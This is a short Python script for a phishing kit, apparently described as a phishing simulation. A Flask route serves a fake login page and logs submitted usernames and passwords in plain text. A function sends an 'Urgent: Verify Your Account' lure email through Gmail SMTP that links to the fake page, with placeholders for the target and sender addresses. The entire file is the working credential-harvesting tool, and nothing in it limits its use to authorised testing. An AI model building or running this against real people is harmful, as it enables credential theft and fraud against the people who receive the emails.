# Python
import smtplib
from email.mime.text import MIMEText
from flask import Flask, request, render_template
import logging
import threading

# Initialize Flask app
app = Flask(__name__)

# Logging setup
logging.basicConfig(filename='phishsim.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Fake login page
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        logging.info(f"Captured credentials - Username: {username}, Password: {password}")
        return "Login failed. Please try again."
    return render_template('login.html')

# Send phishing email
def send_phish_email(target_email, sender_email, subject, body):
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = sender_email
    msg['To'] = target_email

    try:
        # Use a remote SMTP server (e.g., Gmail)
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(sender_email, 'your_password')  # Replace with your email password or app-specific password
            server.sendmail(sender_email, [target_email], msg.as_string())
        print(f"[+] Phishing email sent to {target_email}")
    except Exception as e:
        print(f"[-] Error sending email: {e}")

# Start Flask app in a separate thread
def start_flask_app():
    print("[+] Starting fake login page...")
    app.run(port=5000)

# Main function
def main():
    target_email = "target@example.com"  # Replace with the target email
    sender_email = "your_email@gmail.com"  # Replace with your Gmail address
    subject = "Urgent: Verify Your Account"
    body = """
    Dear User,

    We detected unusual activity on your account. Please verify your credentials by clicking the link below:

    http://localhost:5000/login

    Thank you,
    Support Team
    """

    # Start Flask app in a separate thread
    flask_thread = threading.Thread(target=start_flask_app)
    flask_thread.daemon = True
    flask_thread.start()

    # Send phishing email
    send_phish_email(target_email, sender_email, subject, body)

if __name__ == "__main__":
    main()